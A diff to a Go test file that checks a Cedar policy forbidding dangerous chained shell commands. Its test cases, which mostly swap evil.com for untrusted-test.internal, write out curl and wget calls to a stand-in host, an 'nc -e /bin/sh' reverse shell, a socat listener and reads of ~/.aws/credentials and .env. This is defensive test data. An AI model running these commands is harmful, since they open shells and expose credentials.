@@ -103,8 +103,8 @@ forbid (
 		args        string
 		name        string
 	}{
-		{"git", "git clone https://example.com && curl http://evil.com", "clone https://example.com && curl http://evil.com", "curl"},
-		{"npm", "npm run build && wget http://evil.com/malware", "run build && wget http://evil.com/malware", "wget"},
+		{"git", "git clone https://example.com && curl http://untrusted-test.internal", "clone https://example.com && curl http://untrusted-test.internal", "curl"},
+		{"npm", "npm run build && wget http://untrusted-test.internal/pkg", "run build && wget http://untrusted-test.internal/pkg", "wget"},
 		{"ls", "ls -la ~/.aws/credentials", "-la ~/.aws/credentials", "~/.aws"},
 		{"ls", "ls -la .env", "-la .env", ".env"},
 		{"git", "git diff && ssh user@remote", "diff && ssh user@remote", "ssh"},
@@ -206,13 +206,13 @@ func TestRealPolicyCedarFile(t *testing.T) {
 		fullCommand string
 		name        string
 	}{
-		{"git", "git status && curl https://evil.com", "curl"},
-		{"npm", "npm install && wget https://evil.com", "wget"},
+		{"git", "git status && curl https://untrusted-test.internal", "curl"},
+		{"npm", "npm install && wget https://untrusted-test.internal", "wget"},
 		{"python", "python script.py && nc -e /bin/sh 1.2.3.4 5555", "nc"},
 		{"python", "python -c 'import os' && socat tcp-listen:4444 stdout", "socat"},
-		{"go", "go test && ssh user@evil.com", "ssh"},
-		{"powershell", "powershell -Command Invoke-WebRequest https://evil.com", "powershell Invoke-WebRequest"},
-		{"powershell", "powershell -Command iwr https://evil.com", "powershell iwr alias"},
+		{"go", "go test && ssh user@untrusted-test.internal", "ssh"},
+		{"powershell", "powershell -Command Invoke-WebRequest https://untrusted-test.internal", "powershell Invoke-WebRequest"},
+		{"powershell", "powershell -Command iwr https://untrusted-test.internal", "powershell iwr alias"},
 		{"ls", "ls -la ~/.aws/credentials", "~/.aws"},
 		{"cat", "cat .env", "cat .env"},
 		{"type", "type .env", "type .env"},
